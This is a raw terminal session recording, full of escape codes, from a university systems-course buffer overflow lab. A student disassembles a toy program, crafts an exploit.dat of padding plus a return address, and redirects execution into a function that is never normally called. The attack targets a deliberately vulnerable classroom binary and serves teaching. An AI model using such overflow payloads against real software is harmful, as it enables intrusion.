+  [31m400617[m:[7C[31m48[m [31m8[m[36mb[m [31m45[m [36me8[13Cmov[m    -[31m0x18[m(%[36mrbp[m),%[36mrax[m
+  [31m40061[m[36mb[m:[7C[36mc9[22Cleaveq[m
+  [31m40061[m[36mc[m:[7C[36mc3[22Cretq[m
+
+[31m000000000040061[m[36md[m <[36mecho[m>:
+  [31m40061[m[36md[m:[7C[31m55[m[22C[36mpush[m   %[36mrbp[m
+  [31m40061[m[36me[m:[7C[31m48[m [31m89[m [36me5[16Cmov[m    %[36mrsp[m,%[36mrbp[m
+  [31m400621[m:[7C[31m48[m [31m83[m [36mec[m [31m10[m[13C[36msub[m    $[31m0x10[m,%[36mrsp[m
+  [31m400625[m:[7C[31m48[m [31m8[m[36md[m [31m45[m [36mf0[13Clea[m    -[31m0x10[m(%[36mrbp[m),%[36mrax[m
+  [31m400629[m:[7C[31m48[m [31m89[m [36mc7[16Cmov[m    %[36mrax[m,%[36mrdi[m
+  [31m40062[m[36mc[m:[7C[36me8[m [31m9[m[36mc[m [36mff[m [36mff[m [36mff[10Ccallq[m  [31m4005[m[36mcd[m <[36mmygets[m>
+  [31m400631[m:[7C[31m48[m [31m8[m[36md[m [31m45[m [36mf0[13Clea[m    -[31m0x10[m(%[36mrbp[m),%[36mrax[m
+  [31m400635[m:[7C[31m48[m [31m89[m [36mc7[16Cmov[m    %[36mrax[m,%[36mrdi[m
+  [31m400638[m:[7C[36me8[m [31m43[m [36mfe[m [36mff[m [36mff[10Ccallq[m  [31m400480[m <[36mputs[m@[36mplt[m>
+  [31m40063[m[36md[m:[7C[36mc9[22Cleaveq[m
+  [31m40063[m[36me[m:[7C[36mc3[22Cretq[m
+
+[31m000000000040063[m[36mf[m <[36mnot_called[m>:
+  [31m40063[m[36mf[m:[7C[31m55[m[22C[36mpush[m   %[36mrbp[m
+  [31m400640[m:[7C[31m48[m [31m89[m [36me5[16Cmov[m    %[36mrsp[m,%[36mrbp[m
+  [31m400643[m:[7C[36mbf[m [36mf8[m [31m06 40[m [31m00 [m[9C[36mmov[m    $[31m0x4006f8[m,%[36medi[m
+  [31m400648[m:[7C[36me8[m [31m33[m [36mfe[m [36mff[m [36mff[10Ccallq[m  [31m400480[m <[36mputs[m@[36mplt[m>
+  [31m40064[m[36md[m:[7C[36mbf[m [31m18[m [31m07 40[m [31m00 [m[9C[36mmov[m    $[31m0x400718[m,%[36medi[m
+  [31m400652[m:[7C[36me8[m [31m29[m [36mfe[m [36mff[m [36mff[10Ccallq[m  [31m400480[m <[36mputs[m@[36mplt[m>
+  [31m400657[m:[7C[36mbf[m [31m00 00 00 00 [m[9C[36mmov[m    $[31m0x0[m,%[36medi[m
+  [31m40065[m[36mc[m:[7C[36me8[m [31m5[m[36mf[m [36mfe[m [36mff[m [36mff[10Ccallq[m  [31m4004[m[36mc0[m <[36mexit[m@[36mplt[m>[45;68H164,0-1[7C73%[22;1H[?12l[?25h[?25l[45;69H77[35;1H[?12l[?25h[?25l[1;44r[1;1H[4M[1;45r[41;3H[31m400661[m:[7C[31m66[m [31m2[m[36me[m 0[36mf[m [31m1[m[36mf[m [31m84[m [31m00 00 [m   [36mnopw[m   %[36mcs[m:[31m0x0[m(%[36mrax[m,%[36mrax[m,[31m1[m)
+  [31m400668[m:[7C[31m00 00 00 
+[m  [31m40066[m[36mb[m:[7C0[36mf[m [31m1[m[36mf[m [31m44[m [31m00 00 [m[9C[36mnopl[m   [31m0x0[m(%[36mrax[m,%[36mrax[m,[31m1[m)[45;68H[K[45;68H190,0-1[7C75%[44;1H[?12l[?25h[?25l[45;68H[K[45;1H:[?12l[?25hq[?25l[?12l[?25h[?25l[45;1H[K[45;1H[?1l>[?12l[?25h[?1049l]0;taba238@taba238: ~/CS485G/Lab4/bufdemo/bufdemotaba238@taba238:~/CS485G/Lab4/bufdemo/bufdemo$ ./hex2raw > explot[Kit.dat
+3f 06 40
+]0;taba238@taba238: ~/CS485G/Lab4/bufdemo/bufdemotaba238@taba238:~/CS485G/Lab4/bufdemo/bufdemo$ ls
+[0m[01;32mbufdemo[0m    bufdemo.s    [01;32mhex2raw[0m   [01;32moflow_echo[0m    oflow_echo.s
+bufdemo.c  exploit.dat  Makefile  oflow_echo.c  typescript
+]0;taba238@taba238: ~/CS485G/Lab4/bufdemo/bufdemotaba238@taba238:~/CS485G/Lab4/bufdemo/bufdemo$ vi exploit.dat 
+[?1049h[?1h=[2;1H▽[6n[1;1H  [1;1H[1;45r[?12;25h[?12l[?25h[27m[m[H[2J[?25l[45;1H"exploit.dat" 1L, 4C[>c[1;1H?[34m^F[m@
+[94m~                                                                                    [3;1H~                                                                                    [4;1H~                                                                                    [5;1H~                                                                                    [6;1H~                                                                                    [7;1H~                                                                                    [8;1H~                                                                                    [9;1H~                                                                                    [10;1H~                                                                                    [11;1H~                                                                                    [12;1H~                                                                                    [13;1H~                                                                                    [14;1H~                                                                                    [15;1H~                                                                                    [16;1H~                                                                                    [17;1H~                                                                                    [18;1H~                                                                                    [19;1H~                                                                                    [20;1H~                                                                                    [21;1H~                                                                                    [22;1H~                                                                                    [23;1H~                                                                                    [24;1H~                                                                                    [25;1H~                                                                                    [26;1H~                                                                                    [27;1H~                                                                                    [28;1H~                                                                                    [29;1H~                                                                                    [30;1H~                                                                                    [31;1H~                                                                                    [32;1H~                                                                                    [33;1H~                                                                                    [34;1H~                                                                                    [35;1H~                                                                                    [36;1H~                                                                                    [37;1H~                                                                                    [38;1H~                                                                                    [39;1H~                                                                                    [40;1H~                                                                                    [41;1H~                                                                                    [42;1H~                                                                                    [43;1H~                                                                                    [44;1H~                                                                                    [m[45;68H1,1[11CAll[1;1H[?12l[?25h[?25l[45;1H[1m-- INSERT --[m[45;13H[K[45;68H1,1[11CAll[1;1H[?12l[?25h[?25laaaaaaaaaaaaaaaaaaaaaaaa?[34m^F[m@[45;70H25[1;25H[?12l[?25h[45;1H[K[1;24H[?25l[45;68H1,24[10CAll[1;24H[?12l[?25h[?25l[45;68H[K[45;1H:[?12l[?25hw[?25l[?12l[?25hq[?25l[?12l[?25h[?25l"exploit.dat" 1L, 28C written
+[?1l>[?12l[?25h[?1049l]0;taba238@taba238: ~/CS485G/Lab4/bufdemo/bufdemotaba238@taba238:~/CS485G/Lab4/bufdemo/bufdemo$ ./oflow_echo < exploit.dat 
+aaaaaaaaaaaaaaaaaaaaaaaa?@
+This routine is never called
+If you see this message, something bad has happend
+]0;taba238@taba238: ~/CS485G/Lab4/bufdemo/bufdemotaba238@taba238:~/CS485G/Lab4/bufdemo/bufdemo$ exit
+Script done on Fri 30 Sep 2016 01:47:36 PM EDT
